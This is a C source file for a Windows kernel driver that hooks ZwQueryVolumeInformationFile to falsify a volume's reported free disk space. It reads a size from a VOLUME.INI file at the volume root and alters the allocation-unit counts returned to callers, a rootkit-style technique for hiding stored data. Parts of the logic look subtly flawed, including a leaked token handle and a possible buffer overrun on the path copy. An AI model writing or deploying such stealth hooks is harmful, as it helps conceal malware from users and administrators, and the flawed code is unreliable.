#include <ntddk.h>
#include "disk.h"

typedef unsigned char BYTE, *PBYTE;

WCHAR HardDrives[26];
ULONG SpaceToHide[26];

/*
     ZwQueryvolumeInformationFile Hook to manipulate "available disk space"
*/

ZWQUERYVOLUMEINFORMATIONFILE ZwQueryVolumeInformationFileAddress = NULL;
WCHAR *FilePath = NULL;

NTSTATUS GetFileFullPathByHandle( HANDLE FileHandle )
{
    NTSTATUS status, ret = STATUS_SUCCESS;
    IO_STATUS_BLOCK IoStatusBlock;
    HANDLE hProc, hToken;
    PFILE_NAME_INFORMATION FileNameInfo;
    TOKEN_PRIVILEGES TokenPriv;
    char buffer[1024];
    
    // if we want ZwQueryInformationFile to give us a full path
    // we need the SeChangeNotifyPrivilege
    status = ZwOpenProcessToken(
              NtCurrentProcess(), 
              TOKEN_ALL_ACCESS, 
              &hToken); 
    
    if( !NT_SUCCESS(status) ) 
       return STATUS_UNSUCCESSFUL;
    
    //wbemPrivilegeChangeNotify

    TokenPriv.PrivilegeCount = 1;
    TokenPriv.Privileges[0].Luid = RtlConvertUlongToLuid((ULONG)0x16);
    TokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    // 0x16 <-> SeChangeNotifyPrivilege.
    // http://msdn.microsoft.com/library/default.asp?url=/library/en-us/wmisdk/wmi/privilege_constants.asp
    
    status = ZwAdjustPrivilegesToken(
                hToken,
                FALSE,              // add this priv to the previous ones 
                &TokenPriv,         // ptr to TOKEN_PRIVILEGES struct 
                sizeof(TokenPriv),  // size of struct
                NULL,               // previous privileges
                NULL);              
    
    if( !NT_SUCCESS(status) ) 
       return STATUS_UNSUCCESSFUL;
    
    status = ZwQueryInformationFile(
              FileHandle,  
              &IoStatusBlock,   
              &buffer,
              1024,
              FileNameInformation );
              
    if( NT_SUCCESS(status) ) {
       FileNameInfo = (PFILE_NAME_INFORMATION)&buffer; 
       FilePath = ExAllocatePool(PagedPool, FileNameInfo->FileNameLength);
       if( FilePath ) {
          memcpy( FilePath, FileNameInfo->FileName, FileNameInfo->FileNameLength);
          FilePath[ FileNameInfo->FileNameLength/2 ] = L'\0';
       }          
       else ret = STATUS_UNSUCCESSFUL;
    }
    
    // set the previous privs
    TokenPriv.Privileges[0].Attributes = 0;
    status = ZwAdjustPrivilegesToken(
                hToken,
                FALSE,              
                &TokenPriv,         
                sizeof(TokenPriv),  
                NULL,               
                NULL);              
    
    
    return ret;        
}


NTSTATUS ZwQueryVolumeInformationFileHook(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FsInformation,
    IN ULONG Length,
    IN FS_INFORMATION_CLASS FsInformationClass
)
{
    NTSTATUS status, call;
    PVOID ptrToObject = NULL;
    UNICODE_STRING volume_ini_name;
    OBJECT_ATTRIBUTES volume_ini_attributes;
    IO_STATUS_BLOCK  iosb;
    HANDLE volume_ini_handle;
    ULONG FileNameLength = 0;
    ULONG size=0;
    ULONG SizeToHide=0;
    LARGE_INTEGER startoffset;
    PFILE_FS_FULL_SIZE_INFORMATION FsFullSizeInfo;
    PFILE_FS_SIZE_INFORMATION FsSizeInfo;
    LONGLONG NbUnitToHide;
    LONGLONG NbBytesPerUnit;
    
    status = ZwQueryVolumeInformationFileAddress(
       FileHandle,
       IoStatusBlock,
       FsInformation,
       Length,
       FsInformationClass);       
    
    if( FsInformationClass != FileFsFullSizeInformation &&
        FsInformationClass != FileFsSizeInformation ) 
        return status;
    
    
    call = GetFileFullPathByHandle( FileHandle );
    if( !NT_SUCCESS(call) )
       return status;
    
    if( !wcscmp( FilePath, L"\\" ) ) {
       // we are at the root of a volume
       // let's try to find a VOLUME.INI file
       
       RtlInitUnicodeString( &volume_ini_name, L"VOLUME.INI" );
       
       InitializeObjectAttributes(
          &volume_ini_attributes,            
          &volume_ini_name,
          OBJ_KERNEL_HANDLE,      // accessible only in kernel mode
          FileHandle,             // parent directory is root of the volume
          NULL);                  // no security descriptor
       
       // open our file
       call = ZwCreateFile(
           &volume_ini_handle,
           FILE_READ_DATA,                
           &volume_ini_attributes,
           &iosb,
           NULL,               // no allocation
           FILE_ATTRIBUTE_NORMAL,
           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,    
           FILE_OPEN,          // error if not exist
           FILE_NON_DIRECTORY_FILE,
           NULL,      
           0);          
           
       
       startoffset.QuadPart = 0;
           
       if( NT_SUCCESS(call) ) {
          call = ZwReadFile(
             volume_ini_handle,
             NULL,
             NULL,
             NULL,
             &iosb,
             &SizeToHide,        // we only read a size of ULONG :)
             sizeof(ULONG),
             &startoffset,
             NULL);        
             
          if( NT_SUCCESS(call) ) {
             // ok, now hide it
             if( FsInformationClass == FileFsFullSizeInformation ) {
                FsFullSizeInfo = (PFILE_FS_FULL_SIZE_INFORMATION)FsInformation;
                
                NbBytesPerUnit = FsFullSizeInfo->SectorsPerAllocationUnit 
                                   * FsFullSizeInfo->BytesPerSector;
                NbUnitToHide = (SizeToHide*1048576)/NbBytesPerUnit;                   
                
                if(FsFullSizeInfo->CallerAvailableAllocationUnits.QuadPart ==
                   FsFullSizeInfo->ActualAvailableAllocationUnits.QuadPart)
                {   
                   // this must mean user have access to the full disk
                   FsFullSizeInfo->CallerAvailableAllocationUnits.QuadPart += NbUnitToHide; 
                }    
                FsFullSizeInfo->ActualAvailableAllocationUnits.QuadPart += NbUnitToHide;
                
             }
             if( FsInformationClass == FileFsSizeInformation ) {
                FsSizeInfo = (PFILE_FS_SIZE_INFORMATION)FsInformation;  
                
                NbBytesPerUnit = FsSizeInfo->SectorsPerAllocationUnit 
                                   * FsSizeInfo->BytesPerSector;
                NbUnitToHide = (SizeToHide*1048576)/NbBytesPerUnit;
                
                
                FsSizeInfo->AvailableAllocationUnits.QuadPart += NbUnitToHide; 
             }         
          } 
          ZwClose( volume_ini_handle );
       } // if ntsuccess zwcreatefile
    }  // if wscmp       
    
    
    ExFreePool( FilePath );
    return status;
}
